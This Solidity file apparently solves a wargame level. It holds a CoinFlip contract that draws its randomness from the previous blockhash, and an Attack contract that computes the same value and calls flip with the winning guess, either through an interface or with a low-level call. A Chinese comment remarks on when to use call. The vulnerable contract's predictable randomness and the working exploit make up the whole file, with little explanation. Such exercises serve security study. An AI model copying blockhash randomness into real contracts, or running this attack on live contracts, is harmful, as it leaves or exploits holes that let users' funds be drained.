// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    function attackByInterface(address _addr) public {
        bool side = getFlip();

        ICoinFlip(_addr).flip(side);
    }

    // call 只推荐用于发送以太-在有fallback函数在情况下    其他情况下不推荐-也就是普通函数不推荐使用  但是也能用
    function attackByCall(address _addr) public {
        bool side = getFlip();

        (bool sent, bytes memory data) = _addr.call(
            abi.encodeWithSignature("flip(bool)", side)
        );
        require(sent, "Failed to call function");
    }

    function getFlip() private view returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}
